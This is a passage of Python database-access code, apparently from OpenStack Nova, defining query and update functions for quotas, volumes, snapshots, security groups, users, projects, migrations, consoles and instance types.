tk\n\n\n###################\n\n\n@require_context\ndef quota_get(context, project_id, resource, session=None):\n    result = model_query(context, models.Quota, session=session,\n                         read_deleted=\"no\").\\\n                     filter_by(project_id=project_id).\\\n                     filter_by(resource=resource).\\\n                     first()\n\n    if not result:\n        raise exception.ProjectQuotaNotFound(project_id=project_id)\n\n    return result\n\n\n@require_context\ndef quota_get_all_by_project(context, project_id):\n    authorize_project_context(context, project_id)\n\n    rows = model_query(context, models.Quota, read_deleted=\"no\").\\\n                   filter_by(project_id=project_id).\\\n                   all()\n\n    result = {'project_id': project_id}\n    for row in rows:\n        result[row.resource] = row.hard_limit\n\n    return result\n\n\n@require_admin_context\ndef quota_create(context, project_id, resource, limit):\n    quota_ref = models.Quota()\n    quota_ref.project_id = project_id\n    quota_ref.resource = resource\n    quota_ref.hard_limit = limit\n    quota_ref.save()\n    return quota_ref\n\n\n@require_admin_context\ndef quota_update(context, project_id, resource, limit):\n    session = get_session()\n    with session.begin():\n        quota_ref = quota_get(context, project_id, resource, session=session)\n        quota_ref.hard_limit = limit\n        quota_ref.save(session=session)\n\n\n@require_admin_context\ndef quota_destroy(context, project_id, resource):\n    session = get_session()\n    with session.begin():\n        quota_ref = quota_get(context, project_id, resource, session=session)\n        quota_ref.delete(session=session)\n\n\n@require_admin_context\ndef quota_destroy_all_by_project(context, project_id):\n    session = get_session()\n    with session.begin():\n        quotas = model_query(context, models.Quota, session=session,\n                             read_deleted=\"no\").\\\n                         filter_by(project_id=project_id).\\\n                         all()\n\n        for quota_ref in quotas:\n            quota_ref.delete(session=session)\n\n\n###################\n\n\n@require_context\ndef quota_class_get(context, class_name, resource, session=None):\n    result = model_query(context, models.QuotaClass, session=session,\n                         read_deleted=\"no\").\\\n                     filter_by(class_name=class_name).\\\n                     filter_by(resource=resource).\\\n                     first()\n\n    if not result:\n        raise exception.QuotaClassNotFound(class_name=class_name)\n\n    return result\n\n\n@require_context\ndef quota_class_get_all_by_name(context, class_name):\n    authorize_quota_class_context(context, class_name)\n\n    rows = model_query(context, models.QuotaClass, read_deleted=\"no\").\\\n                   filter_by(class_name=class_name).\\\n                   all()\n\n    result = {'class_name': class_name}\n    for row in rows:\n        result[row.resource] = row.hard_limit\n\n    return result\n\n\n@require_admin_context\ndef quota_class_create(context, class_name, resource, limit):\n    quota_class_ref = models.QuotaClass()\n    quota_class_ref.class_name = class_name\n    quota_class_ref.resource = resource\n    quota_class_ref.hard_limit = limit\n    quota_class_ref.save()\n    return quota_class_ref\n\n\n@require_admin_context\ndef quota_class_update(context, class_name, resource, limit):\n    session = get_session()\n    with session.begin():\n        quota_class_ref = quota_class_get(context, class_name, resource,\n                                          session=session)\n        quota_class_ref.hard_limit = limit\n        quota_class_ref.save(session=session)\n\n\n@require_admin_context\ndef quota_class_destroy(context, class_name, resource):\n    session = get_session()\n    with session.begin():\n        quota_class_ref = quota_class_get(context, class_name, resource,\n                                          session=session)\n        quota_class_ref.delete(session=session)\n\n\n@require_admin_context\ndef quota_class_destroy_all_by_name(context, class_name):\n    session = get_session()\n    with session.begin():\n        quota_classes = model_query(context, models.QuotaClass,\n                                    session=session, read_deleted=\"no\").\\\n                                filter_by(class_name=class_name).\\\n                                all()\n\n        for quota_class_ref in quota_classes:\n            quota_class_ref.delete(session=session)\n\n\n###################\n\n\n@require_admin_context\ndef volume_allocate_iscsi_target(context, volume_id, host):\n    session = get_session()\n    with session.begin():\n        iscsi_target_ref = model_query(context, models.IscsiTarget,\n                                       session=session, read_deleted=\"no\").\\\n                                filter_by(volume=None).\\\n                                filter_by(host=host).\\\n                                with_lockmode('update').\\\n                                first()\n\n        # NOTE(vish): if with_lockmode isn't supported, as in sqlite,\n        #             then this has concurrency issues\n        if not iscsi_target_ref:\n            raise db.NoMoreTargets()\n\n        iscsi_target_ref.volume_id = volume_id\n        session.add(iscsi_target_ref)\n\n    return iscsi_target_ref.target_num\n\n\n@require_admin_context\ndef volume_attached(context, volume_id, instance_id, mountpoint):\n    session = get_session()\n    with session.begin():\n        volume_ref = volume_get(context, volume_id, session=session)\n        volume_ref['status'] = 'in-use'\n        volume_ref['mountpoint'] = mountpoint\n        volume_ref['attach_status'] = 'attached'\n        volume_ref.instance = instance_get(context, instance_id,\n                                           session=session)\n        volume_ref.save(session=session)\n\n\n@require_context\ndef volume_create(context, values):\n    values['volume_metadata'] = _metadata_refs(values.get('metadata'),\n                                               models.VolumeMetadata)\n    volume_ref = models.Volume()\n    volume_ref.update(values)\n\n    session = get_session()\n    with session.begin():\n        volume_ref.save(session=session)\n    return volume_ref\n\n\n@require_admin_context\ndef volume_data_get_for_project(context, project_id):\n    result = model_query(context,\n                         func.count(models.Volume.id),\n                         func.sum(models.Volume.size),\n                         read_deleted=\"no\").\\\n                     filter_by(project_id=project_id).\\\n                     first()\n\n    # NOTE(vish): convert None to 0\n    return (result[0] or 0, result[1] or 0)\n\n\n@require_admin_context\ndef volume_destroy(context, volume_id):\n    session = get_session()\n    with session.begin():\n        session.query(models.Volume).\\\n                filter_by(id=volume_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n        session.query(models.IscsiTarget).\\\n                filter_by(volume_id=volume_id).\\\n                update({'volume_id': None})\n        session.query(models.VolumeMetadata).\\\n                filter_by(volume_id=volume_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n\n\n@require_admin_context\ndef volume_detached(context, volume_id):\n    session = get_session()\n    with session.begin():\n        volume_ref = volume_get(context, volume_id, session=session)\n        volume_ref['status'] = 'available'\n        volume_ref['mountpoint'] = None\n        volume_ref['attach_status'] = 'detached'\n        volume_ref.instance = None\n        volume_ref.save(session=session)\n\n\n@require_context\ndef _volume_get_query(context, session=None, project_only=False):\n    return model_query(context, models.Volume, session=session,\n                       project_only=project_only).\\\n                     options(joinedload('instance')).\\\n                     options(joinedload('volume_metadata')).\\\n                     options(joinedload('volume_type'))\n\n\n@require_context\ndef volume_get(context, volume_id, session=None):\n    result = _volume_get_query(context, session=session, project_only=True).\\\n                    filter_by(id=volume_id).\\\n                    first()\n\n    if not result:\n        raise exception.VolumeNotFound(volume_id=volume_id)\n\n    return result\n\n\n@require_admin_context\ndef volume_get_all(context):\n    return _volume_get_query(context).all()\n\n\n@require_admin_context\ndef volume_get_all_by_host(context, host):\n    return _volume_get_query(context).filter_by(host=host).all()\n\n\n@require_admin_context\ndef volume_get_all_by_instance(context, instance_id):\n    result = model_query(context, models.Volume, read_deleted=\"no\").\\\n                     options(joinedload('volume_metadata')).\\\n                     options(joinedload('volume_type')).\\\n                     filter_by(instance_id=instance_id).\\\n                     all()\n\n    if not result:\n        raise exception.VolumeNotFoundForInstance(instance_id=instance_id)\n\n    return result\n\n\n@require_context\ndef volume_get_all_by_project(context, project_id):\n    authorize_project_context(context, project_id)\n    return _volume_get_query(context).filter_by(project_id=project_id).all()\n\n\n@require_admin_context\ndef volume_get_instance(context, volume_id):\n    result = _volume_get_query(context).filter_by(id=volume_id).first()\n\n    if not result:\n        raise exception.VolumeNotFound(volume_id=volume_id)\n\n    return result.instance\n\n\n@require_admin_context\ndef volume_get_iscsi_target_num(context, volume_id):\n    result = model_query(context, models.IscsiTarget, read_deleted=\"yes\").\\\n                     filter_by(volume_id=volume_id).\\\n                     first()\n\n    if not result:\n        raise exception.ISCSITargetNotFoundForVolume(volume_id=volume_id)\n\n    return result.target_num\n\n\n@require_context\ndef volume_update(context, volume_id, values):\n    session = get_session()\n    metadata = values.get('metadata')\n    if metadata is not None:\n        volume_metadata_update(context,\n                                volume_id,\n                                values.pop('metadata'),\n                                delete=True)\n    with session.begin():\n        volume_ref = volume_get(context, volume_id, session=session)\n        volume_ref.update(values)\n        volume_ref.save(session=session)\n\n\n####################\n\ndef _volume_metadata_get_query(context, volume_id, session=None):\n    return model_query(context, models.VolumeMetadata,\n                       session=session, read_deleted=\"no\").\\\n                    filter_by(volume_id=volume_id)\n\n\n@require_context\n@require_volume_exists\ndef volume_metadata_get(context, volume_id):\n    rows = _volume_metadata_get_query(context, volume_id).all()\n    result = {}\n    for row in rows:\n        result[row['key']] = row['value']\n\n    return result\n\n\n@require_context\n@require_volume_exists\ndef volume_metadata_delete(context, volume_id, key):\n    _volume_metadata_get_query(context, volume_id).\\\n        filter_by(key=key).\\\n        update({'deleted': True,\n                'deleted_at': utils.utcnow(),\n                'updated_at': literal_column('updated_at')})\n\n\n@require_context\n@require_volume_exists\ndef volume_metadata_get_item(context, volume_id, key, session=None):\n    result = _volume_metadata_get_query(context, volume_id, session=session).\\\n                    filter_by(key=key).\\\n                    first()\n\n    if not result:\n        raise exception.VolumeMetadataNotFound(metadata_key=key,\n                                               volume_id=volume_id)\n    return result\n\n\n@require_context\n@require_volume_exists\ndef volume_metadata_update(context, volume_id, metadata, delete):\n    session = get_session()\n\n    # Set existing metadata to deleted if delete argument is True\n    if delete:\n        original_metadata = volume_metadata_get(context, volume_id)\n        for meta_key, meta_value in original_metadata.iteritems():\n            if meta_key not in metadata:\n                meta_ref = volume_metadata_get_item(context, volume_id,\n                                                    meta_key, session)\n                meta_ref.update({'deleted': True})\n                meta_ref.save(session=session)\n\n    meta_ref = None\n\n    # Now update all existing items with new values, or create new meta objects\n    for meta_key, meta_value in metadata.iteritems():\n\n        # update the value whether it exists or not\n        item = {\"value\": meta_value}\n\n        try:\n            meta_ref = volume_metadata_get_item(context, volume_id,\n                                                  meta_key, session)\n        except exception.VolumeMetadataNotFound, e:\n            meta_ref = models.VolumeMetadata()\n            item.update({\"key\": meta_key, \"volume_id\": volume_id})\n\n        meta_ref.update(item)\n        meta_ref.save(session=session)\n\n    return metadata\n\n\n###################\n\n\n@require_context\ndef snapshot_create(context, values):\n    snapshot_ref = models.Snapshot()\n    snapshot_ref.update(values)\n\n    session = get_session()\n    with session.begin():\n        snapshot_ref.save(session=session)\n    return snapshot_ref\n\n\n@require_admin_context\ndef snapshot_destroy(context, snapshot_id):\n    session = get_session()\n    with session.begin():\n        session.query(models.Snapshot).\\\n                filter_by(id=snapshot_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n\n\n@require_context\ndef snapshot_get(context, snapshot_id, session=None):\n    result = model_query(context, models.Snapshot, session=session,\n                         project_only=True).\\\n                filter_by(id=snapshot_id).\\\n                first()\n\n    if not result:\n        raise exception.SnapshotNotFound(snapshot_id=snapshot_id)\n\n    return result\n\n\n@require_admin_context\ndef snapshot_get_all(context):\n    return model_query(context, models.Snapshot).all()\n\n\n@require_context\ndef snapshot_get_all_for_volume(context, volume_id):\n    return model_query(context, models.Snapshot, read_deleted='no',\n                       project_only=True).\\\n              filter_by(volume_id=volume_id).all()\n\n\n@require_context\ndef snapshot_get_all_by_project(context, project_id):\n    authorize_project_context(context, project_id)\n    return model_query(context, models.Snapshot).\\\n                   filter_by(project_id=project_id).\\\n                   all()\n\n\n@require_context\ndef snapshot_update(context, snapshot_id, values):\n    session = get_session()\n    with session.begin():\n        snapshot_ref = snapshot_get(context, snapshot_id, session=session)\n        snapshot_ref.update(values)\n        snapshot_ref.save(session=session)\n\n\n###################\n\n\ndef _block_device_mapping_get_query(context, session=None):\n    return model_query(context, models.BlockDeviceMapping, session=session,\n                       read_deleted=\"no\")\n\n\n@require_context\ndef block_device_mapping_create(context, values):\n    bdm_ref = models.BlockDeviceMapping()\n    bdm_ref.update(values)\n\n    session = get_session()\n    with session.begin():\n        bdm_ref.save(session=session)\n\n\n@require_context\ndef block_device_mapping_update(context, bdm_id, values):\n    session = get_session()\n    with session.begin():\n        _block_device_mapping_get_query(context, session=session).\\\n                filter_by(id=bdm_id).\\\n                update(values)\n\n\n@require_context\ndef block_device_mapping_update_or_create(context, values):\n    session = get_session()\n    with session.begin():\n        result = _block_device_mapping_get_query(context, session=session).\\\n                 filter_by(instance_id=values['instance_id']).\\\n                 filter_by(device_name=values['device_name']).\\\n                 first()\n        if not result:\n            bdm_ref = models.BlockDeviceMapping()\n            bdm_ref.update(values)\n            bdm_ref.save(session=session)\n        else:\n            result.update(values)\n\n        # NOTE(yamahata): same virtual device name can be specified multiple\n        #                 times. So delete the existing ones.\n        virtual_name = values['virtual_name']\n        if (virtual_name is not None and\n            block_device.is_swap_or_ephemeral(virtual_name)):\n            session.query(models.BlockDeviceMapping).\\\n                filter_by(instance_id=values['instance_id']).\\\n                filter_by(virtual_name=virtual_name).\\\n                filter(models.BlockDeviceMapping.device_name !=\n                       values['device_name']).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n\n\n@require_context\ndef block_device_mapping_get_all_by_instance(context, instance_id):\n    return _block_device_mapping_get_query(context).\\\n                 filter_by(instance_id=instance_id).\\\n                 all()\n\n\n@require_context\ndef block_device_mapping_destroy(context, bdm_id):\n    session = get_session()\n    with session.begin():\n        session.query(models.BlockDeviceMapping).\\\n                filter_by(id=bdm_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n\n\n@require_context\ndef block_device_mapping_destroy_by_instance_and_volume(context, instance_id,\n                                                        volume_id):\n    session = get_session()\n    with session.begin():\n        _block_device_mapping_get_query(context, session=session).\\\n            filter_by(instance_id=instance_id).\\\n            filter_by(volume_id=volume_id).\\\n            update({'deleted': True,\n                    'deleted_at': utils.utcnow(),\n                    'updated_at': literal_column('updated_at')})\n\n\n###################\n\ndef _security_group_get_query(context, session=None, read_deleted=None,\n                              project_only=False):\n    return model_query(context, models.SecurityGroup, session=session,\n                       read_deleted=read_deleted, project_only=project_only).\\\n                   options(joinedload_all('rules'))\n\n\n@require_context\ndef security_group_get_all(context):\n    return _security_group_get_query(context).all()\n\n\n@require_context\ndef security_group_get(context, security_group_id, session=None):\n    result = _security_group_get_query(context, session=session,\n                                       project_only=True).\\\n                    filter_by(id=security_group_id).\\\n                    options(joinedload_all('instances')).\\\n                    first()\n\n    if not result:\n        raise exception.SecurityGroupNotFound(\n                security_group_id=security_group_id)\n\n    return result\n\n\n@require_context\ndef security_group_get_by_name(context, project_id, group_name):\n    result = _security_group_get_query(context, read_deleted=\"no\").\\\n                        filter_by(project_id=project_id).\\\n                        filter_by(name=group_name).\\\n                        options(joinedload_all('instances')).\\\n                        first()\n\n    if not result:\n        raise exception.SecurityGroupNotFoundForProject(\n                project_id=project_id, security_group_id=group_name)\n\n    return result\n\n\n@require_context\ndef security_group_get_by_project(context, project_id):\n    return _security_group_get_query(context, read_deleted=\"no\").\\\n                        filter_by(project_id=project_id).\\\n                        all()\n\n\n@require_context\ndef security_group_get_by_instance(context, instance_id):\n    return _security_group_get_query(context, read_deleted=\"no\").\\\n                   join(models.SecurityGroup.instances).\\\n                   filter_by(id=instance_id).\\\n                   all()\n\n\n@require_context\ndef security_group_exists(context, project_id, group_name):\n    try:\n        group = security_group_get_by_name(context, project_id, group_name)\n        return group is not None\n    except exception.NotFound:\n        return False\n\n\n@require_context\ndef security_group_in_use(context, group_id):\n    session = get_session()\n    with session.begin():\n        # Are there any instances that haven't been deleted\n        # that include this group?\n        inst_assoc = session.query(models.SecurityGroupInstanceAssociation).\\\n                filter_by(security_group_id=group_id).\\\n                filter_by(deleted=False).\\\n                all()\n        for ia in inst_assoc:\n            num_instances = session.query(models.Instance).\\\n                        filter_by(deleted=False).\\\n                        filter_by(id=ia.instance_id).\\\n                        count()\n            if num_instances:\n                return True\n\n    return False\n\n\n@require_context\ndef security_group_create(context, values):\n    security_group_ref = models.SecurityGroup()\n    # FIXME(devcamcar): Unless I do this, rules fails with lazy load exception\n    # once save() is called.  This will get cleaned up in next orm pass.\n    security_group_ref.rules\n    security_group_ref.update(values)\n    security_group_ref.save()\n    return security_group_ref\n\n\n@require_context\ndef security_group_destroy(context, security_group_id):\n    session = get_session()\n    with session.begin():\n        session.query(models.SecurityGroup).\\\n                filter_by(id=security_group_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n        session.query(models.SecurityGroupInstanceAssociation).\\\n                filter_by(security_group_id=security_group_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n        session.query(models.SecurityGroupIngressRule).\\\n                filter_by(group_id=security_group_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n\n\n@require_context\ndef security_group_count_by_project(context, project_id):\n    authorize_project_context(context, project_id)\n    return model_query(context, models.SecurityGroup, read_deleted=\"no\").\\\n                   filter_by(project_id=project_id).\\\n                   count()\n\n###################\n\n\ndef _security_group_rule_get_query(context, session=None):\n    return model_query(context, models.SecurityGroupIngressRule,\n                       session=session)\n\n\n@require_context\ndef security_group_rule_get(context, security_group_rule_id, session=None):\n    result = _security_group_rule_get_query(context, session=session).\\\n                         filter_by(id=security_group_rule_id).\\\n                         first()\n\n    if not result:\n        raise exception.SecurityGroupNotFoundForRule(\n                                               rule_id=security_group_rule_id)\n\n    return result\n\n\n@require_context\ndef security_group_rule_get_by_security_group(context, security_group_id,\n                                              session=None):\n    return _security_group_rule_get_query(context, session=session).\\\n                         filter_by(parent_group_id=security_group_id).\\\n                         options(joinedload_all('grantee_group.instances')).\\\n                         all()\n\n\n@require_context\ndef security_group_rule_get_by_security_group_grantee(context,\n                                                      security_group_id,\n                                                      session=None):\n\n    return _security_group_rule_get_query(context, session=session).\\\n                         filter_by(group_id=security_group_id).\\\n                         all()\n\n\n@require_context\ndef security_group_rule_create(context, values):\n    security_group_rule_ref = models.SecurityGroupIngressRule()\n    security_group_rule_ref.update(values)\n    security_group_rule_ref.save()\n    return security_group_rule_ref\n\n\n@require_context\ndef security_group_rule_destroy(context, security_group_rule_id):\n    session = get_session()\n    with session.begin():\n        security_group_rule = security_group_rule_get(context,\n                                                      security_group_rule_id,\n                                                      session=session)\n        security_group_rule.delete(session=session)\n\n\n@require_context\ndef security_group_rule_count_by_group(context, security_group_id):\n    return model_query(context, models.SecurityGroupIngressRule,\n                   read_deleted=\"no\").\\\n                   filter_by(parent_group_id=security_group_id).\\\n                   count()\n\n#\n###################\n\n\n@require_admin_context\ndef provider_fw_rule_create(context, rule):\n    fw_rule_ref = models.ProviderFirewallRule()\n    fw_rule_ref.update(rule)\n    fw_rule_ref.save()\n    return fw_rule_ref\n\n\n@require_admin_context\ndef provider_fw_rule_get_all(context):\n    return model_query(context, models.ProviderFirewallRule).all()\n\n\n@require_admin_context\ndef provider_fw_rule_destroy(context, rule_id):\n    session = get_session()\n    with session.begin():\n        session.query(models.ProviderFirewallRule).\\\n                filter_by(id=rule_id).\\\n                update({'deleted': True,\n                        'deleted_at': utils.utcnow(),\n                        'updated_at': literal_column('updated_at')})\n\n\n###################\n\n\n@require_admin_context\ndef user_get(context, id, session=None):\n    result = model_query(context, models.User, session=session).\\\n                     filter_by(id=id).\\\n                     first()\n\n    if not result:\n        raise exception.UserNotFound(user_id=id)\n\n    return result\n\n\n@require_admin_context\ndef user_get_by_access_key(context, access_key, session=None):\n    result = model_query(context, models.User, session=session).\\\n                   filter_by(access_key=access_key).\\\n                   first()\n\n    if not result:\n        raise exception.AccessKeyNotFound(access_key=access_key)\n\n    return result\n\n\n@require_admin_context\ndef user_create(context, values):\n    user_ref = models.User()\n    user_ref.update(values)\n    user_ref.save()\n    return user_ref\n\n\n@require_admin_context\ndef user_delete(context, id):\n    session = get_session()\n    with session.begin():\n        session.query(models.UserProjectAssociation).\\\n                filter_by(user_id=id).\\\n                delete()\n        session.query(models.UserRoleAssociation).\\\n                filter_by(user_id=id).\\\n                delete()\n        session.query(models.UserProjectRoleAssociation).\\\n                filter_by(user_id=id).\\\n                delete()\n        user_ref = user_get(context, id, session=session)\n        session.delete(user_ref)\n\n\ndef user_get_all(context):\n    return model_query(context, models.User).all()\n\n\ndef user_get_roles(context, user_id):\n    session = get_session()\n    with session.begin():\n        user_ref = user_get(context, user_id, session=session)\n        return [role.role for role in user_ref['roles']]\n\n\ndef user_get_roles_for_project(context, user_id, project_id):\n    session = get_session()\n    with session.begin():\n        res = session.query(models.UserProjectRoleAssociation).\\\n                   filter_by(user_id=user_id).\\\n                   filter_by(project_id=project_id).\\\n                   all()\n        return [association.role for association in res]\n\n\ndef user_remove_project_role(context, user_id, project_id, role):\n    session = get_session()\n    with session.begin():\n        session.query(models.UserProjectRoleAssociation).\\\n                filter_by(user_id=user_id).\\\n                filter_by(project_id=project_id).\\\n                filter_by(role=role).\\\n                delete()\n\n\ndef user_remove_role(context, user_id, role):\n    session = get_session()\n    with session.begin():\n        res = session.query(models.UserRoleAssociation).\\\n                    filter_by(user_id=user_id).\\\n                    filter_by(role=role).\\\n                    all()\n        for role in res:\n            session.delete(role)\n\n\ndef user_add_role(context, user_id, role):\n    session = get_session()\n    with session.begin():\n        user_ref = user_get(context, user_id, session=session)\n        models.UserRoleAssociation(user=user_ref, role=role).\\\n               save(session=session)\n\n\ndef user_add_project_role(context, user_id, project_id, role):\n    session = get_session()\n    with session.begin():\n        user_ref = user_get(context, user_id, session=session)\n        project_ref = project_get(context, project_id, session=session)\n        models.UserProjectRoleAssociation(user_id=user_ref['id'],\n                                          project_id=project_ref['id'],\n                                          role=role).save(session=session)\n\n\ndef user_update(context, user_id, values):\n    session = get_session()\n    with session.begin():\n        user_ref = user_get(context, user_id, session=session)\n        user_ref.update(values)\n        user_ref.save(session=session)\n\n\n###################\n\n\ndef project_create(context, values):\n    project_ref = models.Project()\n    project_ref.update(values)\n    project_ref.save()\n    return project_ref\n\n\ndef project_add_member(context, project_id, user_id):\n    session = get_session()\n    with session.begin():\n        project_ref = project_get(context, project_id, session=session)\n        user_ref = user_get(context, user_id, session=session)\n\n        project_ref.members += [user_ref]\n        project_ref.save(session=session)\n\n\ndef project_get(context, id, session=None):\n    result = model_query(context, models.Project, session=session,\n                         read_deleted=\"no\").\\\n                     filter_by(id=id).\\\n                     options(joinedload_all('members')).\\\n                     first()\n\n    if not result:\n        raise exception.ProjectNotFound(project_id=id)\n\n    return result\n\n\ndef project_get_all(context):\n    return model_query(context, models.Project).\\\n                   options(joinedload_all('members')).\\\n                   all()\n\n\ndef project_get_by_user(context, user_id):\n    user = model_query(context, models.User).\\\n                   filter_by(id=user_id).\\\n                   options(joinedload_all('projects')).\\\n                   first()\n\n    if not user:\n        raise exception.UserNotFound(user_id=user_id)\n\n    return user.projects\n\n\ndef project_remove_member(context, project_id, user_id):\n    session = get_session()\n    project = project_get(context, project_id, session=session)\n    user = user_get(context, user_id, session=session)\n\n    if user in project.members:\n        project.members.remove(user)\n        project.save(session=session)\n\n\ndef project_update(context, project_id, values):\n    session = get_session()\n    with session.begin():\n        project_ref = project_get(context, project_id, session=session)\n        project_ref.update(values)\n        project_ref.save(session=session)\n\n\ndef project_delete(context, id):\n    session = get_session()\n    with session.begin():\n        session.query(models.UserProjectAssociation).\\\n                filter_by(project_id=id).\\\n                delete()\n        session.query(models.UserProjectRoleAssociation).\\\n                filter_by(project_id=id).\\\n                delete()\n        project_ref = project_get(context, id, session=session)\n        session.delete(project_ref)\n\n\n@require_context\ndef project_get_networks(context, project_id, associate=True):\n    # NOTE(tr3buchet): as before this function will associate\n    # a project with a network if it doesn't have one and\n    # associate is true\n    result = model_query(context, models.Network, read_deleted=\"no\").\\\n                     filter_by(project_id=project_id).\\\n                     all()\n\n    if not result:\n        if not associate:\n            return []\n\n        return [network_associate(context, project_id)]\n\n    return result\n\n\n###################\n\n\n@require_admin_context\ndef migration_create(context, values):\n    migration = models.Migration()\n    migration.update(values)\n    migration.save()\n    return migration\n\n\n@require_admin_context\ndef migration_update(context, id, values):\n    session = get_session()\n    with session.begin():\n        migration = migration_get(context, id, session=session)\n        migration.update(values)\n        migration.save(session=session)\n        return migration\n\n\n@require_admin_context\ndef migration_get(context, id, session=None):\n    result = model_query(context, models.Migration, session=session,\n                         read_deleted=\"yes\").\\\n                     filter_by(id=id).\\\n                     first()\n\n    if not result:\n        raise exception.MigrationNotFound(migration_id=id)\n\n    return result\n\n\n@require_admin_context\ndef migration_get_by_instance_and_status(context, instance_uuid, status):\n    result = model_query(context, models.Migration, read_deleted=\"yes\").\\\n                     filter_by(instance_uuid=instance_uuid).\\\n                     filter_by(status=status).\\\n                     first()\n\n    if not result:\n        raise exception.MigrationNotFoundByStatus(instance_id=instance_uuid,\n                                                  status=status)\n\n    return result\n\n\n@require_admin_context\ndef migration_get_all_unconfirmed(context, confirm_window, session=None):\n    confirm_window = datetime.datetime.utcnow() - datetime.timedelta(\n            seconds=confirm_window)\n\n    return model_query(context, models.Migration, session=session,\n                       read_deleted=\"yes\").\\\n            filter(models.Migration.updated_at <= confirm_window).\\\n            filter_by(status=\"finished\").\\\n            all()\n\n\n##################\n\n\ndef console_pool_create(context, values):\n    pool = models.ConsolePool()\n    pool.update(values)\n    pool.save()\n    return pool\n\n\ndef console_pool_get(context, pool_id):\n    result = model_query(context, models.ConsolePool, read_deleted=\"no\").\\\n                     filter_by(id=pool_id).\\\n                     first()\n\n    if not result:\n        raise exception.ConsolePoolNotFound(pool_id=pool_id)\n\n    return result\n\n\ndef console_pool_get_by_host_type(context, compute_host, host,\n                                  console_type):\n\n    result = model_query(context, models.ConsolePool, read_deleted=\"no\").\\\n                   filter_by(host=host).\\\n                   filter_by(console_type=console_type).\\\n                   filter_by(compute_host=compute_host).\\\n                   options(joinedload('consoles')).\\\n                   first()\n\n    if not result:\n        raise exception.ConsolePoolNotFoundForHostType(\n                host=host, console_type=console_type,\n                compute_host=compute_host)\n\n    return result\n\n\ndef console_pool_get_all_by_host_type(context, host, console_type):\n    return model_query(context, models.ConsolePool, read_deleted=\"no\").\\\n                   filter_by(host=host).\\\n                   filter_by(console_type=console_type).\\\n                   options(joinedload('consoles')).\\\n                   all()\n\n\ndef console_create(context, values):\n    console = models.Console()\n    console.update(values)\n    console.save()\n    return console\n\n\ndef console_delete(context, console_id):\n    session = get_session()\n    with session.begin():\n        # NOTE(mdragon): consoles are meant to be transient.\n        session.query(models.Console).\\\n                filter_by(id=console_id).\\\n                delete()\n\n\ndef console_get_by_pool_instance(context, pool_id, instance_id):\n    result = model_query(context, models.Console, read_deleted=\"yes\").\\\n                   filter_by(pool_id=pool_id).\\\n                   filter_by(instance_id=instance_id).\\\n                   options(joinedload('pool')).\\\n                   first()\n\n    if not result:\n        raise exception.ConsoleNotFoundInPoolForInstance(\n                pool_id=pool_id, instance_id=instance_id)\n\n    return result\n\n\ndef console_get_all_by_instance(context, instance_id):\n    return model_query(context, models.Console, read_deleted=\"yes\").\\\n                   filter_by(instance_id=instance_id).\\\n                   all()\n\n\ndef console_get(context, console_id, instance_id=None):\n    query = model_query(context, models.Console, read_deleted=\"yes\").\\\n                    filter_by(id=console_id).\\\n                    options(joinedload('pool'))\n\n    if instance_id is not None:\n        query = query.filter_by(instance_id=instance_id)\n\n    result = query.first()\n\n    if not result:\n        if instance_id:\n            raise exception.ConsoleNotFoundForInstance(\n                    console_id=console_id, instance_id=instance_id)\n        else:\n            raise exception.ConsoleNotFound(console_id=console_id)\n\n    return result\n\n\n##################\n\n\n@require_admin_context\ndef instance_type_create(context, values):\n    \"\"\"Create a new instance type. In order to pass in extra specs,\n    the values dict should contain a 'extra_specs' key/value pair:\n\n    {'extra_specs' : {'k1': 'v1', 'k2': 'v2', ...}}\n\n    \"\"\"\n    session = get_session()\n    with session.begin():\n        try:\n            instance_type_get_by_name(context, values['name'], session)\n            raise exception.InstanceTypeExists(name=values['name'])\n        except exception.InstanceTypeNotFoundByName:\n            pass\n        try:\n            instance_type_get_by_flavor_id(context, values['flavorid'],\n                                           session)\n            raise exception.InstanceTypeExists(name=values['name'])\n        except exception.FlavorNotFound:\n            pass\n        try:\n            specs = values.get('extra_specs')\n            specs_refs = []\n            if specs:\n                for k, v in specs.iteritems():\n                    specs_ref = models.InstanceTypeExtraSpecs()\n                    specs_ref['key'] = k\n                    specs_ref['value'] = v\n                    specs_refs.append(specs_ref)\n            values['extra_specs'] = specs_refs\n            instance_type_ref = models.InstanceTypes()\n            instance_type_ref.update(values)\n            instance_type_ref.save(session=session)\n        except Exception, e:\n            raise exception.DBError(e)\n        return _dict_with_extra_specs(instance_type_ref)\n\n\ndef _dict_with_extra_specs(inst_type_query):\n    \"\"\"Takes an instance, volume, or instance type query returned\n    by sqlalchemy and returns it as a dictionary, converting the\n    extra_specs entry from a list of dicts:\n\n    'extra_specs' : [{'key': 'k1', 'value': 'v1', ...}, ...]\n\n    to a single dict:\n\n    'extra_specs' : {'k1': 'v1'}\n\n    \"\"\"\n    inst_type_dict = dict(inst_type_query)\n    extra_specs = dict([(x['key'], x['value'])\n                        for x in inst_type_query['extra_specs']])\n    inst_type_dict['extra_specs'] = extra_specs\n    return inst_type_dict\n\n\ndef _instance_type_get_query(context, session=None, read_deleted=None):\n    return model_query(context, models.InstanceTypes, session=session,\n                       read_deleted=read_deleted).\\\n                     options(joinedload('extra_specs'))\n\n\n@require_context\ndef instance_type_get_all(context, inactive=False, filters=None):\n    \"\"\"\n    Returns all instance types.\n    \"\"\"\n    filters = filters or {}\n    read_deleted = \"yes\" if inactive else \"no\"\n    query = _instance_type_get_query(context, read_deleted=read_deleted)\n\n    if 'min_memory_mb' in filters:\n        query = query.filter(\n                models.InstanceTypes.memory_mb >= filters['min_memory_mb'])\n    if 'min_root_gb' in filters:\n        query = query.filter(\n                models.InstanceTypes.root_gb >= filters['min_root_gb'])\n\n    inst_types = query.order_by(\"name\").all()\n\n    return [_dict_with_extra_specs(i) for i in inst_types]\n\n\n@require_context\ndef instance_type_get(context, 